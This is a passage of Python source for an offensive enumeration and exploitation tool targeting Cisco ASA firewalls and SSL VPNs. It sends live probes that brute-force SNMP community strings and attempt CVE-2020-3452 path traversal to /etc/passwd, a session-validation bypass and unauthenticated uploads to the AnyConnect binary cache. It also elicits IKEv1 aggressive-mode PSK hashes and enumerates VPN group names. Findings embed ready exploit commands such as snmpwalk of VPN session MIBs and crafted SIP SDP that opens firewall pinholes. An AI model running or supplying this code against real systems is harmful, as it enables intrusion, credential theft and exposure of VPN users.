        SIP INVITE triggers RTP UDP pinholes for negotiated media ports.
        RTSP creates a data-channel pinhole similarly.

        Three probe vectors:
        1. REST API GET /api/v1/firewall/inspection — reads inspection policy state.
        2. FTP socket probe (TCP/21) — send PORT command, observe ASA intercept.
        3. SIP OPTIONS probe (TCP/5060) — detect SIP inspect surface.
        """
        findings = []

        # --- 1. REST API inspection policy state ---
        sc, body, _, _ = _get(f'{self.base_url}/api/v1/firewall/inspection', timeout=5)
        if sc == 200 and body:
            body_lower = body.lower()
            if 'ftp' in body_lower:
                sev = 'HIGH' if ('enabled' in body_lower or '"true"' in body_lower) else 'INFO'
                findings.append({
                    'type': 'FTP Application Inspection State Readable (REST API)',
                    'severity': sev,
                    'description': (
                        f'ASA REST /api/v1/firewall/inspection on {self.host} discloses FTP '
                        'inspection state. FTP active mode creates ACL-bypass TCP/20 pinholes.'
                    ),
                    'detail': body[:300],
                    'exploit': (
                        'FTP PORT command causes ASA to admit inbound TCP/20 bypassing outside ACL. '
                        'Trigger: connect FTP to any ASA-reachable server, issue PORT with '
                        'target addr:port — ASA opens the secondary channel without ACL check.'
                    ),
                })
            if 'sip' in body_lower:
                findings.append({
                    'type': 'SIP Application Inspection Enabled (REST API)',
                    'severity': 'MEDIUM',
                    'description': (
                        f'SIP inspection confirmed on {self.host} via REST API — '
                        'creates dynamic UDP pinholes for RTP media streams.'
                    ),
                    'detail': body[:300],
                    'exploit': (
                        'Craft SIP INVITE with SDP c=IN IP4 <attacker> m=audio <port>; '
                        'ASA opens UDP pinhole to attacker-specified addr:port bypassing ACL.'
                    ),
                })

        # --- 2. FTP socket probe (active mode pinhole) ---
        if not any('FTP' in f.get('type', '') for f in findings):
            ftp_sock = None
            try:
                ftp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                ftp_sock.settimeout(5)
                ftp_sock.connect((self.host, 21))
                banner = ftp_sock.recv(1024).decode('utf-8', errors='replace')
                if '220' in banner:
                    ftp_sock.sendall(b'USER anonymous\r\n')
                    ftp_sock.recv(512)
                    # PORT command: request ASA open secondary connection
                    ftp_sock.sendall(b'PORT 1,2,3,4,0,21\r\n')
                    port_resp = ftp_sock.recv(512).decode('utf-8', errors='replace')
                    findings.append({
                        'type': 'FTP Active Mode Pinhole Surface (TCP/21 Accessible)',
                        'severity': 'HIGH',
                        'description': (
                            f'FTP TCP/21 reachable on {self.host}. ASA FTP inspection '
                            '(enabled by default) creates ACL-bypass pinholes for PORT-mode data connections.'
                        ),
                        'detail': (
                            f'Banner: {banner.strip()[:120]}\n'
                            f'PORT response: {port_resp.strip()[:120]}'
                        ),
                        'exploit': (
                            'FTP active mode: PORT <attacker-ip>,<port-high>,<port-low> → '
                            'ASA intercepts, opens TCP/20 inbound pinhole to attacker-controlled '
                            'addr:port bypassing interface ACL. Confirmed by ch12 syslog '
                            '302015/302016 (data connection built/torn down).'
                        ),
                    })
            except Exception:
                pass
            finally:
                if ftp_sock:
                    try:
                        ftp_sock.close()
                    except Exception:
                        pass

        # --- 3. SIP OPTIONS probe (TCP/5060) ---
        if not any('SIP' in f.get('type', '') for f in findings):
            sip_sock = None
            try:
                sip_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sip_sock.settimeout(5)
                sip_sock.connect((self.host, 5060))
                sip_options = (
                    f'OPTIONS sip:{self.host} SIP/2.0\r\n'
                    f'Via: SIP/2.0/TCP {self.host}:5060;branch=z9hG4bK-enum\r\n'
                    f'From: <sip:probe@{self.host}>;tag=enum1\r\n'
                    f'To: <sip:{self.host}>\r\n'
                    f'Call-ID: enum-probe-{self.host}@scan\r\n'
                    f'CSeq: 1 OPTIONS\r\n'
                    f'Max-Forwards: 1\r\n'
                    f'Content-Length: 0\r\n\r\n'
                )
                sip_sock.sendall(sip_options.encode())
                sip_resp = sip_sock.recv(2048).decode('utf-8', errors='replace')
                if 'SIP/2.0' in sip_resp:
                    findings.append({
                        'type': 'SIP Inspect Surface — TCP/5060 Responsive',
                        'severity': 'MEDIUM',
                        'description': (
                            f'SIP service responds on {self.host}:5060. ASA SIP inspection '
                            'creates dynamic UDP pinholes for RTP media streams (ACL bypass).'
                        ),
                        'detail': f'SIP response: {sip_resp[:200]}',
                        'exploit': (
                            'SIP INVITE with crafted SDP: c=IN IP4 <attacker> m=audio <port> → '
                            'ASA opens UDP pinhole to attacker. RTP pinholes bypass outside ACL '
                            'for negotiated media port range — lateral movement into media tier.'
                        ),
                    })
            except Exception:
                pass
            finally:
                if sip_sock:
                    try:
                        sip_sock.close()
                    except Exception:
                        pass

        self.findings.extend(findings)
        return findings

    # ── Packet-tracer REST API ─────────────────────────────────────────────────

    def probe_packet_tracer_rest(self) -> list:
        """Probe ASA packet-tracer REST API for unauthenticated policy simulation.

        From Moraes ch04: packet-tracer simulates a packet through the ASA policy
        engine — ACLs, NAT, inspection — without live traffic. The REST API wrapper
        exposes this as a POST endpoint. If unauthenticated, an attacker can
        enumerate all ACL permit/deny decisions for arbitrary traffic tuples,
        map NAT translation rules, and discover open inspection policy paths
        without touching any production traffic or triggering IDS signatures.
        """
        findings = []
        body_bytes = json.dumps({
            'inputInterface': 'outside',
            'sourceIP': '1.2.3.4',
            'destinationIP': '10.0.0.1',
            'protocol': 'tcp',
            'sourcePort': 12345,
            'destinationPort': 80,
        }).encode('utf-8')
        json_headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
        }

        for api_port in (55443, 443):
            base = (f'https://{self.host}:{api_port}'
                    if api_port != 443 else self.base_url)
            url = f'{base}/api/v1/firewall/packet-tracer'
            req = urllib.request.Request(
                url, data=body_bytes, headers=json_headers, method='POST'
            )
            try:
                ctx = _ssl_ctx(False)
                with urllib.request.urlopen(req, timeout=6, context=ctx) as resp:
                    sc = resp.status
                    body = resp.read().decode('utf-8', errors='replace')
                    if sc == 200:
                        findings.append({
                            'type': 'Packet-Tracer REST API Accessible (Unauthenticated)',
                            'severity': 'MEDIUM',
                            'description': (
                                f'ASA packet-tracer REST at {url} responded HTTP 200 without auth. '
                                'Full policy simulation: ACL decisions, NAT translations, inspection '
                                'policy — enumerable for any traffic tuple without live packets.'
                            ),
                            'detail': body[:400],
                            'exploit': (
                                f'curl -sk -X POST {url} '
                                '-H "Content-Type: application/json" '
                                '-d \'{"inputInterface":"outside","sourceIP":"1.2.3.4",'
                                '"destinationIP":"10.0.0.1","protocol":"tcp",'
                                '"sourcePort":12345,"destinationPort":80}\' '
                                '→ enumerate ACL/NAT policy for arbitrary tuples unauthenticated.'
                            ),
                        })
            except urllib.error.HTTPError as e:
                if e.code == 401:
                    findings.append({
                        'type': 'Packet-Tracer REST API Present (Auth Required)',
                        'severity': 'LOW',
                        'description': (
                            f'Packet-tracer REST endpoint {url} exists; auth required (HTTP 401). '
                            'Test with admin:cisco or any REST API credential found.'
                        ),
                        'detail': f'HTTP 401 | Port: {api_port}',
                    })
                # 404 = endpoint absent; skip silently
            except Exception:
                pass

            if findings:
                break

        self.findings.extend(findings)
        return findings

    # ── SNMP community string probe (Phase 7 security finding) ────────────────

    def probe_snmp_community_strings(self) -> list:
        """SNMP v1 community string brute-force; returns CRITICAL finding on hit.

        From Moraes ch04 (NSEL/logging) and ASA defaults: SNMP is enabled by
        default with read-only community 'public' in many deployments. A valid
        community string grants full MIB-tree read access — equivalent to
        'show run' for many OIDs. Key MIBs: CISCO-REMOTE-ACCESS-MONITOR-MIB
        (active VPN session usernames + source IPs) and CISCO-VPN-SESSION-DB-MIB
        (full session detail including assigned IPs, bytes, duration).

        Distinct from probe_snmp() (Phase 1 version extraction); this is the
        dedicated Phase 7 security finding at CRITICAL severity.
        """
        findings = []
        oid = SNMP_OIDS['sysDescr']

        for community in SNMP_DEFAULT_COMMUNITIES:
            pkt = _snmp_get_packet(community, oid, version=0)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(3)
            try:
                sock.sendto(pkt, (self.host, 161))
                data, _ = sock.recvfrom(4096)
                if data and len(data) > 10:
                    strings = _parse_snmp_octet_strings(data)
                    value = next(
                        (s for s in strings
                         if community not in s and len(s) > 4),
                        None,
                    )
                    findings.append({
                        'type': f'SNMP Community String Accepted: "{community}"',
                        'severity': 'CRITICAL',
                        'description': (
                            f'SNMP v1 community "{community}" accepted on {self.host}:161 — '
                            'full MIB read access. sysDescr discloses ASA version, hardware model, '
                            'serial number. VPN MIBs expose active session usernames and source IPs.'
                        ),
                        'detail': (
                            f'Community: {community}\n'
                            f'sysDescr: {value[:200] if value else "(response received)"}'
                        ),
                        'exploit': (
                            f'snmpwalk -v1 -c {community} {self.host} 1.3.6.1 → full MIB tree.\n'
                            f'snmpwalk -v1 -c {community} {self.host} '
                            '1.3.6.1.4.1.9.9.392.1.3 '
                            '→ CISCO-REMOTE-ACCESS-MONITOR-MIB: active VPN usernames + source IPs.\n'
                            f'snmpwalk -v1 -c {community} {self.host} '
                            '1.3.6.1.4.1.9.9.491 '
                            '→ CISCO-VPN-SESSION-DB-MIB: full session detail.'
                        ),
                    })
                    break  # stop on first accepted community
            except Exception:
                pass
            finally:
                try:
                    sock.close()
                except Exception:
                    pass

        self.findings.extend(findings)
        return findings

    # ── Report ────────────────────────────────────────────────────────────────

    def report(self):
        lines = ['=' * 60, f'CISCO ASA ENUMERATION: {self.name} ({self.host})', '=' * 60]

        if self.version_info:
            lines.append('\nVersion Info:')
            for k, v in self.version_info.items():
                lines.append(f'  {k}: {v}')

        if self.groups:
            lines.append(f'\nTunnel Groups ({len(self.groups)}):')
            for g in self.groups:
                auth = self.auth_types.get(g, 'unknown')
                saml = ' [SAML]' if g in self.saml_groups else ''
                lines.append(f'  {g} ({auth}){saml}')

        if self.csrf_token:
            lines.append(f'\nCSRF Token: {self.csrf_token}')

        if self.findings:
            crit  = [f for f in self.findings if f['severity'] == 'CRITICAL']
            high  = [f for f in self.findings if f['severity'] == 'HIGH']
            other = [f for f in self.findings if f['severity'] not in ('CRITICAL', 'HIGH')]
            lines.append(
                f'\nFindings: {len(self.findings)} '
                f'({len(crit)} CRITICAL, {len(high)} HIGH, {len(other)} other)'
            )
            for f in (crit + high + other):
                lines.append(f'\n  [{f["severity"]}] {f["type"]}')
                lines.append(f'  {f["description"]}')
                if 'detail' in f:
                    for dl in f['detail'].splitlines():
                        lines.append(f'    {dl}')
                if 'exploit' in f:
                    lines.append(f'  EXPLOIT: {f["exploit"][:120]}')

        return '\n'.join(lines)



# ── Standalone probe functions (Ch22: Clientless SSL VPN) ────────────────────

def probe_ssl_vpn_portal_config(host, port=443, timeout=5.0):
    """SSL VPN portal enumeration — endpoint exposure + auth surface."""
    findings = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    base = f"https://{host}:{port}"

    def _get(path, headers=None):
        req = urllib.request.Request(f"{base}{path}", headers=headers or {})
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return r.status, r.read(4096)
        except urllib.error.HTTPError as e:
            return e.code, b""
        except Exception:
            return None, b""

    status, _ = _get("/+CSCOE+/logon.html")
    if status == 200:
        findings.append({
            "severity": "LOW",
            "title": "CLIENTLESS_SSL_VPN_PORTAL_ACTIVE",
            "detail": "Logon page reachable without authentication",
            "host": host,
            "port": port,
        })

    status, body = _get("/+CSCOE+/portal.html")
    if status == 200 and body:
        findings.append({
            "severity": "MEDIUM",
            "title": "SSL_VPN_PORTAL_ACCESSIBLE",
            "detail": "Portal HTML returned without authenticated session gate",
            "host": host,
            "port": port,
        })

    status, _ = _get("/+CSCOE+/portal_maps.html")
    if status == 200:
        findings.append({
            "severity": "MEDIUM",
            "title": "BOOKMARK_GROUPS_ACCESSIBLE",
            "detail": "Bookmark group map page accessible unauthenticated",
            "host": host,
            "port": port,
        })

    status, _ = _get("/+CSCOU+/win.js")
    if status == 200:
        findings.append({
            "severity": "MEDIUM",
            "title": "SSL_VPN_JS_EXPOSED",
            "detail": "SSL VPN JavaScript bundle accessible without session",
            "host": host,
            "port": port,
        })

    # POST auth endpoint probe
    payload = b"username=test&password=test&Login=Login"
    req = urllib.request.Request(
        f"{base}/+CSCOE+/logon.html",
        data=payload,
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
            post_status = r.status
            post_body = r.read(4096)
    except urllib.error.HTTPError as e:
        post_status = e.code
        post_body = b""
    except Exception:
        post_status = None
        post_body = b""
    if post_status in (200, 302):
        findings.append({
            "severity": "LOW",
            "title": "SSL_VPN_AUTH_ENDPOINT_ACCESSIBLE",
            "detail": f"Auth POST accepted (HTTP {post_status}); response contains 'Error': {b'Error' in post_body}",
            "host": host,
            "port": port,
        })

    return findings


def probe_csd_bypass(host, port=443, timeout=5.0):
    """Cisco Secure Desktop (CSD) and Host Scan bypass probes."""
    findings = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    base = f"https://{host}:{port}"

    def _get(path, headers=None):
        req = urllib.request.Request(f"{base}{path}", headers=headers or {})
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return r.status, r.read(4096)
        except urllib.error.HTTPError as e:
            return e.code, b""
        except Exception:
            return None, b""

    status, _ = _get("/+CSCOE+/sdesktop/")
    if status == 200:
        findings.append({
            "severity": "MEDIUM",
            "title": "CSD_ENDPOINT_ACCESSIBLE",
            "detail": "Cisco Secure Desktop endpoint accessible unauthenticated",
            "host": host,
            "port": port,
        })

    status, body = _get("/+CSCOU+/vdesk/get-active-session?lang=en")
    if status == 200:
        findings.append({
            "severity": "HIGH",
            "title": "CSD_SESSION_QUERY_UNAUTH",
            "detail": f"Active session query returned data without auth; body: {body[:200]}",
            "host": host,
            "port": port,
        })

    status, _ = _get("/+CSCOU+/hostscan")
    if status == 200:
        findings.append({
            "severity": "HIGH",
            "title": "HOST_SCAN_ENDPOINT_ACCESSIBLE",
            "detail": "Host Scan endpoint reachable without authentication",
            "host": host,
            "port": port,
        })

    status, _ = _get("/+CSCOE+/endpoint.html")
    if status == 200:
        findings.append({
            "severity": "MEDIUM",
            "title": "ENDPOINT_ASSESSMENT_ACCESSIBLE",
            "detail": "Endpoint assessment page accessible unauthenticated",
            "host": host,
            "port": port,
        })

    # Session validation bypass: attempt portal with randomized session cookie
    import os
    fake_session = base64.b64encode(os.urandom(16)).decode()
    status, body = _get("/+CSCOE+/portal.html", headers={"Cookie": f"webvpnc={fake_session}"})
    if status == 200 and body:
        findings.append({
            "severity": "HIGH",
            "title": "SESSION_VALIDATION_BYPASS",
            "detail": "Portal served content with a random session cookie — missing session validation",
            "host": host,
            "port": port,
        })

    return findings


def probe_ssl_vpn_file_share(host, port=443, session_cookie: str = None, timeout=5.0):
    """File share access via SSL VPN — directory exposure + CVE-2020-3452 pattern."""
    findings = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    base = f"https://{host}:{port}"

    def _get(path, extra_headers=None):
        headers = {}
        if session_cookie:
            headers["Cookie"] = f"webvpn={session_cookie}"
        if extra_headers:
            headers.update(extra_headers)
        req = urllib.request.Request(f"{base}{path}", headers=headers)
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return r.status, r.read(8192)
        except urllib.error.HTTPError as e:
            return e.code, b""
        except Exception:
            return None, b""

    status, _ = _get("/+CSCOE+/files/dpd.html")
    if status == 200:
        findings.append({
            "severity": "MEDIUM",
            "title": "FILE_BROWSE_ENDPOINT_ACCESSIBLE",
            "detail": "SSL VPN file-browse endpoint reachable",
            "host": host,
            "port": port,
        })

    status, body = _get("/+CSCOE+/files/")
    if status == 200 and body:
        findings.append({
            "severity": "HIGH",
            "title": "SSL_VPN_FILE_SERVER_ACCESSIBLE",
            "detail": f"File server root accessible; body snippet: {body[:200]}",
            "host": host,
            "port": port,
        })

    # CVE-2020-3452 path traversal pattern
    for traversal in [
        "/+CSCOE+/files?path=/",
        "/+CSCOE+/files%2F..%2F..%2F..%2Fetc%2Fpasswd",
    ]:
        status, body = _get(traversal)
        if status == 200 and body and (b"/" in body or b"root" in body):
            findings.append({
                "severity": "CRITICAL",
                "title": "FILE_PATH_TRAVERSAL_POSSIBLE",
                "detail": f"CVE-2020-3452 pattern: {traversal} returned data; body: {body[:200]}",
                "host": host,
                "port": port,
            })
            break

    # Localhost bypass via X-Forwarded-For
    status, body = _get("/+CSCOE+/files/", extra_headers={"X-Forwarded-For": "127.0.0.1"})
    if status == 200 and body:
        findings.append({
            "severity": "MEDIUM",
            "title": "LOCALHOST_BYPASS_ATTEMPTED",
            "detail": "File endpoint returned content when X-Forwarded-For: 127.0.0.1 was set",
            "host": host,
            "port": port,
        })

    return findings


def probe_anyconnect_version(host, port=443, timeout=5.0):
    """AnyConnect version fingerprinting and installer exposure."""
    findings = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    base = f"https://{host}:{port}"

    def _get(path, method="GET", data=None, headers=None):
        req = urllib.request.Request(
            f"{base}{path}",
            data=data,
            headers=headers or {},
            method=method,
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return r.status, r.read(4096)
        except urllib.error.HTTPError as e:
            return e.code, b""
        except Exception:
            return None, b""

    pkg_path = "/CACHE/stc/2/binaries/anyconnect-win-4.10.00093-webdeploy-k9.pkg"
    status, body = _get(pkg_path)
    if status == 200:
        findings.append({
            "severity": "HIGH",
            "title": "ANYCONNECT_INSTALLER_EXPOSED",
            "detail": f"AnyConnect installer accessible at {pkg_path}; size hint: {len(body)} bytes",
            "host": host,
            "port": port,
        })

    status, _ = _get("/+CSCOU+/anyconnect-win.exe")
    if status == 200:
        findings.append({
            "severity": "HIGH",
            "title": "ANYCONNECT_WIN_EXE_EXPOSED",
            "detail": "AnyConnect Windows executable accessible without authentication",
            "host": host,
            "port": port,
        })

    # Unauthenticated multipart POST to binary cache
    boundary = "----AblationBoundary"
    mp_body = (
        f"--{boundary}\r\nContent-Disposition: form-data; name=\"file\"\r\n\r\ntest\r\n"
        f"--{boundary}--\r\n"
    ).encode()
    status, body = _get(
        "/CACHE/stc/1/binaries/",
        method="POST",
        data=mp_body,
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    if status == 200:
        findings.append({
            "severity": "CRITICAL",
            "title": "ANYCONNECT_BINARY_CACHE_WRITE_UNAUTH",
            "detail": "Unauthenticated multipart POST to /CACHE/stc/1/binaries/ returned 200",
            "host": host,
            "port": port,
        })

    status, body = _get("/+CSCOE+/np_required_status")
    if status == 200 and body:
        findings.append({
            "severity": "LOW",
            "title": "ANYCONNECT_VERSION_FINGERPRINTED",
            "detail": f"Version status endpoint reachable; body: {body[:200]}",
            "host": host,
            "port": port,
        })

    return findings


def probe_dap_profile_exposure(host, port=443, timeout=5.0):
    """DAP (Dynamic Access Policies) profile and config exposure."""
    findings = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    base = f"https://{host}:{port}"

    def _get(path):
        req = urllib.request.Request(f"{base}{path}")
        try:
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                return r.status, r.read(4096)
        except urllib.error.HTTPError as e:
            return e.code, b""
        except Exception:
            return None, b""

    status, body = _get("/+CSCOE+/dap.js")
    if status == 200 and body:
        findings.append({
            "severity": "MEDIUM",
            "title": "DAP_JAVASCRIPT_EXPOSED",
            "detail": f"DAP JavaScript accessible without auth; size: {len(body)} bytes",
            "host": host,
            "port": port,
        })

    status, body = _get("/+CSCOE+/session?auth=none")
    if status == 200 and body:
        findings.append({
            "severity": "CRITICAL",
            "title": "SESSION_CREATED_WITHOUT_AUTH",
            "detail": f"Session endpoint returned content with auth=none; body: {body[:200]}",
            "host": host,
            "port": port,
        })

    status, body = _get("/+CSCOE+/config")
    if status == 200 and body:
        findings.append({
            "severity": "CRITICAL",
            "title": "CONFIG_ENDPOINT_ACCESSIBLE",
            "detail": f"Config endpoint returned data without authentication; body: {body[:200]}",
            "host": host,
            "port": port,
        })

    return findings


# ── IPSec / IKE Enumeration ───────────────────────────────────────────────────

def probe_ikev1_aggressive_mode(host, port=500, timeout=5.0):
    """
    IKEv1 aggressive mode enumeration over UDP/500.

    Sends a minimal IKEv1 aggressive mode initiation packet and checks whether
    the ASA responds — any response indicates the service is live; a matching
    exchange type (aggressive mode) in the response indicates the mode is
    enabled and PSK hash disclosure is possible.

    Packet layout:
      IKE header  (28 bytes): initiator_cookie(8) + responder_cookie(8) +
                               next_payload(1) + version(1) + exchange_type(1) +
                               flags(1) + message_id(4) + length(4)
      SA payload   (52 bytes): generic_hdr(4) + DOI(4) + situation(4) +
                               proposal_hdr(4) + transform_hdr(4) +
                               transform_attrs (3DES/MD5/DH2/PSK)
      KE payload  (132 bytes): generic_hdr(4) + 128-byte DH group-2 dummy value
      Nonce payload(20 bytes): generic_hdr(4) + 16-byte random nonce
      ID payload   (12 bytes): generic_hdr(4) + id_type(1) + proto(1) +
                               port(2) + IPv4 0.0.0.0(4)
    """
    import os

    initiator_cookie = os.urandom(8)
    responder_cookie = b'\x00' * 8

    # --- SA payload (proposal: 3DES-CBC + MD5 + DH2 + PSK) ---
    # Transform attributes (IKE attribute format: type(2) + value(2))
    #   encryption: 3DES-CBC = 5
    #   hash:       MD5      = 1
    #   auth-method: PSK     = 1
    #   DH group:   group-2  = 2
    #   life-type:  seconds  = 1
    #   life-dur:   28800
    transform_attrs = (
        struct.pack('!HH', 0x8001, 5) +    # encryption: 3DES-CBC
        struct.pack('!HH', 0x8002, 1) +    # hash: MD5
        struct.pack('!HH', 0x8003, 1) +    # auth method: PSK
        struct.pack('!HH', 0x8004, 2) +    # DH group: 2
        struct.pack('!HH', 0x800B, 1) +    # life type: seconds
        struct.pack('!HH', 0x800C, 28800)  # life duration: 28800s
    )
    transform_len = 8 + len(transform_attrs)  # generic hdr(4) + transform_hdr(4) + attrs
    # Transform sub-structure: next(1)=0, reserved(1)=0, length(2), num(1)=1, id(1)=1, reserved2(2)=0
    transform_payload = struct.pack('!BBHBBH', 0, 0, transform_len, 1, 1, 0) + transform_attrs

    proposal_len = 8 + len(transform_payload)  # generic hdr(4) + proposal_hdr(4) + transform
    # Proposal sub-structure: next(1)=0, reserved(1)=0, length(2), num(1)=1, proto(1)=1(ISAKMP),
    #   spi_size(1)=0, num_transforms(1)=1
    proposal_payload = struct.pack('!BBHBBBB', 0, 0, proposal_len, 1, 1, 0, 1) + transform_payload

    doi = 1       # IPSEC
    situation = 1  # SIT_IDENTITY_ONLY
    sa_body = struct.pack('!II', doi, situation) + proposal_payload
    sa_len = 4 + len(sa_body)  # generic hdr(4) + body
    # SA payload generic header: next_payload=0x0A (KE), reserved=0, length=sa_len
    sa_payload = struct.pack('!BBH', 0x0A, 0, sa_len) + sa_body

    # --- KE payload ---
    ke_value = b'\x00' * 128  # dummy DH group-2 public value
    ke_len = 4 + len(ke_value)
    # KE generic header: next_payload=0x05 (Nonce), reserved=0, length
    ke_payload = struct.pack('!BBH', 0x05, 0, ke_len) + ke_value

    # --- Nonce payload ---
    nonce_value = os.urandom(16)
    nonce_len = 4 + len(nonce_value)
    # Nonce generic header: next_payload=0x05 (ID), reserved=0, length
    nonce_payload = struct.pack('!BBH', 0x05, 0, nonce_len) + nonce_value

    # --- ID payload ---
    # id_type=1 (ID_IPV4_ADDR), proto=17(UDP), port=0, IP=0.0.0.0
    id_body = struct.pack('!BBH4s', 1, 17, 0, b'\x00\x00\x00\x00')
    id_len = 4 + len(id_body)
    # ID generic header: next_payload=0, reserved=0, length
    id_payload = struct.pack('!BBH', 0, 0, id_len) + id_body

    # Wire up next-payload chain now that sizes are known:
    # SA -> KE -> Nonce -> ID (already encoded above with correct next values)
    # But Nonce's next_payload should be ID (0x05), already set above.
    # ID's next_payload is 0 (none), already set above.

    body = sa_payload + ke_payload + nonce_payload + id_payload
    total_len = 28 + len(body)

    # --- IKE header ---
    # next_payload=0x04(SA), version=0x10(v1.0), exchange_type=0x04(aggressive),
    # flags=0x00, message_id=0, length=total
    ike_header = (
        initiator_cookie +
        responder_cookie +
        struct.pack('!BBBBII', 0x04, 0x10, 0x04, 0x00, 0, total_len)
    )

    packet = ike_header + body

    finding = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(packet, (host, port))
        try:
            data, _ = sock.recvfrom(4096)
        finally:
            sock.close()

        if len(data) >= 28:
            resp_exchange = data[18]  # exchange_type byte in IKE header
            if resp_exchange == 0x04:
                finding = {
                    "severity": "CRITICAL",
                    "title": "IKEV1_AGGRESSIVE_MODE_ENABLED",
                    "detail": (
                        "ASA responded to IKEv1 aggressive mode initiation with matching "
                        "exchange type 0x04. Pre-shared key hash is transmitted in cleartext "
                        "and is offline-crackable (CVE-2002-1623 class). "
                        f"Response length: {len(data)} bytes."
                    ),
                    "host": host,
                    "port": port,
                }
            else:
                finding = {
                    "severity": "HIGH",
                    "title": "IKEV1_AGGRESSIVE_MODE_RESPONDS",
                    "detail": (
                        f"ASA responded to IKEv1 aggressive mode probe (exchange_type in "
                        f"response: 0x{resp_exchange:02x}). Service is live on UDP/{port}. "
                        f"Response length: {len(data)} bytes."
                    ),
                    "host": host,
                    "port": port,
                }
        else:
            finding = {
                "severity": "HIGH",
                "title": "IKEV1_AGGRESSIVE_MODE_RESPONDS",
                "detail": (
                    f"ASA sent a short response ({len(data)} bytes) to IKEv1 aggressive mode "
                    f"probe on UDP/{port} — service active."
                ),
                "host": host,
                "port": port,
            }
    except (socket.timeout, OSError):
        finding = {
            "severity": "INFO",
            "title": "IKEV1_AGGRESSIVE_MODE_NO_RESPONSE",
            "detail": f"No response to IKEv1 aggressive mode probe on UDP/{port} within {timeout}s.",
            "host": host,
            "port": port,
        }

    return finding


def probe_isakmp_version(host, port=500, timeout=3.0):
    """
    ISAKMP version fingerprint via IKE INFORMATIONAL packet (UDP/500).

    Sends a minimal ISAKMP header with no payloads (exchange_type=5, INFORMATIONAL).
    Parses the version field (byte 17) from any response to distinguish IKEv1 from IKEv2.
    """
    import os

    initiator_cookie = os.urandom(8)
    responder_cookie = b'\x00' * 8

    # ISAKMP header: 28 bytes total, no payloads
    # next_payload=0, major_version=1, minor_version=0 -> version_byte=0x10
    # exchange_type=5 (INFORMATIONAL), flags=0, message_id=0, length=28
    header = (
        initiator_cookie +
        responder_cookie +
        struct.pack('!BBBBII', 0x00, 0x10, 0x05, 0x00, 0, 28)
    )

    finding = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(timeout)
        sock.sendto(header, (host, port))
        try:
            data, _ = sock.recvfrom(4096)
        finally:
            sock.close()

        if len(data) >= 18:
            version_byte = data[17]
            major = (version_byte >> 4) & 0x0F
            minor = version_byte & 0x0F
            version_str = f"IKEv{major}.{minor}"
            if major == 1:
                finding = {
                    "severity": "MEDIUM",
                    "title": "ISAKMP_V1_ACTIVE",
                    "detail": (
                        f"ISAKMP {version_str} detected on UDP/{port}. "
                        "IKEv1 is deprecated (RFC 7296 obsoletes RFC 2409); "
                        "aggressive mode and weak cipher suites are a known risk surface. "
                        f"Raw version byte: 0x{version_byte:02x}."
                    ),
                    "host": host,
                    "port": port,
                }
            elif major == 2:
                finding = {
                    "severity": "LOW",
                    "title": "ISAKMP_V2_ACTIVE",
                    "detail": (
                        f"ISAKMP {version_str} detected on UDP/{port}. "
                        "IKEv2 does not support aggressive mode; attack surface reduced. "
                        f"Raw version byte: 0x{version_byte:02x}."
                    ),
                    "host": host,
                    "port": port,
                }
            else:
                finding = {
                    "severity": "INFO",
                    "title": "ISAKMP_UNKNOWN_VERSION",
                    "detail": (
                        f"ISAKMP response received on UDP/{port} but version field "
                        f"is unrecognised: 0x{version_byte:02x} (major={major}, minor={minor}). "
                        f"Response length: {len(data)} bytes."
                    ),
                    "host": host,
                    "port": port,
                }
        else:
            finding = {
                "severity": "INFO",
                "title": "ISAKMP_SHORT_RESPONSE",
                "detail": (
                    f"ISAKMP probe on UDP/{port} elicited a {len(data)}-byte response "
                    "(too short to parse version field)."
                ),
                "host": host,
                "port": port,
            }
    except (socket.timeout, OSError):
        finding = {
            "severity": "INFO",
            "title": "ISAKMP_NO_RESPONSE",
            "detail": f"No ISAKMP response on UDP/{port} within {timeout}s.",
            "host": host,
            "port": port,
        }

    return finding


def probe_vpn_group_names(host, port=500, timeout=5.0, group_names: list = None):
    """
    VPN group name enumeration via the IKEv1 aggressive-mode GroupName oracle (UDP/500).

    Cisco ASA differentiates valid vs. invalid tunnel-group names in aggressive mode:
    - Valid group: the ASA processes the exchange (potentially responds with SA / KE payloads).
    - Invalid group: rapid ISAKMP NOTIFY with 0x0018 (No Proposal Chosen) or no response.

    The timing side-channel (and the differing NOTIFY message content) allows enumeration
    of configured tunnel-group names without credentials.

    ID payload type 0x11 (KEY_ID) carries the group name as raw bytes — this is the
    Cisco-specific IKE group-name bearer used by the VPN client negotiation.
    """
    import os

    if group_names is None:
        group_names = [
            "vpn", "remote", "employees", "cisco", "asa",
            "admin", "staff", "users", "vpngroup", "DefaultL2LGroup",
        ]

    def _build_aggressive_packet(group_name_bytes):
        """Build IKEv1 aggressive mode packet with KEY_ID group name in ID payload."""
        initiator_cookie = os.urandom(8)
        responder_cookie = b'\x00' * 8

        # SA payload (3DES/MD5/DH2/PSK) — same structure as probe_ikev1_aggressive_mode
        transform_attrs = (
            struct.pack('!HH', 0x8001, 5) +
            struct.pack('!HH', 0x8002, 1) +
            struct.pack('!HH', 0x8003, 1) +
            struct.pack('!HH', 0x8004, 2) +
